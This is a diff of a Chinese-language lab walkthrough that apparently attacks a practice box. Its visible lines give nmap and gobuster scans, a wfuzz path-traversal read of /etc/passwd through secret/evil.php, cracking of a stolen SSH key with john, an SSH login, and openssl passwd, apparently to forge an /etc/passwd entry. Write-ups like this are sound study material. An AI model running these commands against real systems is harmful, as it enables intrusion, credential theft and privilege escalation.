@@ -18,7 +18,7 @@ tags:
 
   
 
-```
+```bash
 
 sudo nmap -sn 10.10.10.0/24
 
@@ -40,7 +40,7 @@ sudo nmap -sn 10.10.10.0/24
 
 扫描开放的端口
 
-```
+```bash
 
 sudo nmap --min-rate 10000 -p- 10.10.10.18
 
@@ -50,7 +50,7 @@ sudo nmap --min-rate 10000 -p- 10.10.10.18
 
 扫描开放端口的基本信息，并将结果保存到本地以便于随时观看
 
-```
+```bash
 
 sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan
 
@@ -64,7 +64,7 @@ sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan
 
 使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地
 
-```
+```bash
 
 sudo nmap --script=vuln -p22,80 10.10.10.18 -oA nmap/Script
 
@@ -80,7 +80,7 @@ sudo nmap --script=vuln -p22,80 10.10.10.18 -oA nmap/Script
 
   
 
-```
+```bash
 
 sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt
 
@@ -124,7 +124,7 @@ gobuster 告诉我们 secret 下面可能还有目录，
 
   
 
-```
+```bash
 
 sudo gobuster dir -u http://10.10.10.18/secret -w /usr/share/dirb/wordlists/common.txt -x http,php,html  
 
@@ -144,7 +144,7 @@ fuzz 一下试试
 
   
 
-```
+```bash
 
 sudo wfuzz -u "10.10.10.18/secret/evil.php?FUZZ=../../../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/common.txt --hw 0
 
@@ -162,7 +162,7 @@ sudo wfuzz -u "10.10.10.18/secret/evil.php?FUZZ=../../../../../../etc/passwd" -w
 
   
 
-```
+```bash
 
 http://10.10.10.18/secret/evil.php?command=../../../../../../etc/passwd
 
@@ -194,7 +194,7 @@ http://10.10.10.18/secret/evil.php?command=../../../../../../etc/passwd
 
   
 
-```
+```bash
 
 /usr/share/john/ssh2john.py hash/id_rsa > hash_rsa
 
@@ -206,7 +206,7 @@ http://10.10.10.18/secret/evil.php?command=../../../../../../etc/passwd
 
   
 
-```
+```bash
 
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa    
 
@@ -226,7 +226,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa    
 
   
 
-```
+```bash
 
 ssh mowree@10.10.10.18 -i hash/id_rsa
 
@@ -238,7 +238,7 @@ ssh mowree@10.10.10.18 -i hash/id_rsa
 
   
 
-```
+```bash
 
 ls -liah /etc/passwd
 
@@ -254,7 +254,7 @@ ls -liah /etc/passwd
 
   
 
-```
+```bash
 
 openssl passwd admin
 
